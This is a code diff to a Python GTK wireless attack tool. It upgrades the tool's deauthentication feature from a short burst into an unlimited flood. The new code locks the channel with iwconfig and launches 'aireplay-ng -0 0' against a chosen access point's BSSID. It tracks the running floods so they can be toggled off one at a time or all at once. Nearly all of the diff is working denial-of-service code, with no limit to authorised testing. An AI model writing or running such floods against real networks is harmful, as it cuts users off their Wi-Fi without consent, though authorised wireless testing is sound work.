@@ -215,6 +215,13 @@ class APRow(Gtk.ListBoxRow):
     # nothing over just stashing it here at UI construction time.
     builder = None
 
+    # Class-level registry of *the one* deauth flood we allow at a time,
+    # keyed by BSSID.  aireplay-ng -0 0 keeps hammering forever; we want
+    # every UI toggle to reach that specific subprocess to stop it, and
+    # we want a global "Stop All Deauths" button to be able to walk this
+    # dict.  {bssid_upper: subprocess.Popen}
+    _deauth_procs: dict = {}
+
     def __init__(self, bssid, ch, sec, pwr, ssid, manufacturer):
         super(APRow, self).__init__()
         self.bssid = bssid
@@ -265,7 +272,7 @@ class APRow(Gtk.ListBoxRow):
         self.add(button)
 
     def ap_clicked(self, widget):
-        # Context menu: Copy MAC + Deauth (in-place) + one "Send to <tab>"
+        # Context menu: Copy MAC + Deauth toggle + one "Send to <tab>"
         # entry per attack module that expects a BSSID.  Each Send-to
         # item populates the target tab's entry fields, then switches
         # the notebook to that tab so the user is one click away from
@@ -276,9 +283,23 @@ class APRow(Gtk.ListBoxRow):
         copy_mac.connect("activate", self.copy_mac)
         context_menu.append(copy_mac)
 
-        deauth = Gtk.MenuItem(label="Deauth (quick)")
+        # Deauth is a toggle now: label switches based on whether a
+        # flood is already running against this specific BSSID.  A
+        # separate "Stop All Deauths" item is always shown so the user
+        # can panic-stop even if the row that started the flood scrolls
+        # off screen.
+        is_running = self.bssid.upper() in APRow._deauth_procs
+        deauth_label = ("Stop Deauth on this AP" if is_running
+                        else "Start Deauth on this AP")
+        deauth = Gtk.MenuItem(label=deauth_label)
         deauth.connect("activate", self.deauth)
         context_menu.append(deauth)
+
+        if APRow._deauth_procs:
+            stop_all = Gtk.MenuItem(
+                label=f"Stop All Deauths ({len(APRow._deauth_procs)} running)")
+            stop_all.connect("activate", lambda _w: APRow.stop_all_deauths())
+            context_menu.append(stop_all)
 
         context_menu.append(Gtk.SeparatorMenuItem())
 
@@ -345,10 +366,69 @@ class APRow(Gtk.ListBoxRow):
         pyperclip.copy(self.bssid)
 
     def deauth(self, widget):
+        """Toggle a continuous deauth flood against this AP.
+
+        Previous version fired ``aireplay-ng -0 10`` and returned, so
+        there was no way to stop or extend the attack.  Now we keep the
+        subprocess alive (``-0 0`` = infinite burst) and register it in
+        ``_deauth_procs`` so the same menu item can terminate it on the
+        next click, and so ``stop_all_deauths`` can walk every active
+        flood in one shot.
+
+        The channel is locked with ``iwconfig`` before the flood starts
+        because airodump keeps hopping channels while it scans, and
+        aireplay silently drops frames when the radio wanders off.
+        """
+        key = self.bssid.upper()
+        proc = APRow._deauth_procs.get(key)
+        if proc is not None:
+            # Toggle-off: kill the running flood.
+            print(f'[deauth] stop {self.bssid}')
+            try:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=2)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+            except Exception as exc:
+                print(f'[deauth] terminate failed for {self.bssid}: {exc}')
+            APRow._deauth_procs.pop(key, None)
+            return
+
+        # Toggle-on: lock the channel, then spawn an infinite flood.
         iface = Functions.read_config()['interface']
-        print(f'Deauthenticating all clients connected with {self.bssid} on channel {self.ch}')
-        Functions.execute_cmd(f'iwconfig {iface} channel {self.ch}')
-        Functions.execute_cmd(f'aireplay-ng -0 10 -a {self.bssid} {iface}')
+        print(f'[deauth] start on {self.bssid} ch {self.ch} via {iface}')
+        # iwconfig is best-effort; on modern kernels `iw` is preferred
+        # but iwconfig is still shipped by wireless-tools and just works
+        # for setting a single channel on an already-monitor iface.
+        subprocess.run(['iwconfig', iface, 'channel', str(self.ch)],
+                       check=False)
+        proc = subprocess.Popen(
+            ['aireplay-ng', '-0', '0', '-a', self.bssid, iface],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        APRow._deauth_procs[key] = proc
+
+    @classmethod
+    def stop_all_deauths(cls):
+        """Kill every deauth flood we've ever spawned.
+
+        Called by the "Stop All Deauths" context-menu item and could be
+        wired to a keyboard shortcut later.  Idempotent: if a proc is
+        already dead we just drop the entry.
+        """
+        for key, proc in list(cls._deauth_procs.items()):
+            print(f'[deauth] stop-all: killing {key}')
+            try:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=1)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+            except Exception as exc:
+                print(f'[deauth] stop-all failed for {key}: {exc}')
+            cls._deauth_procs.pop(key, None)
 
     def watch(self, widget):
         pass
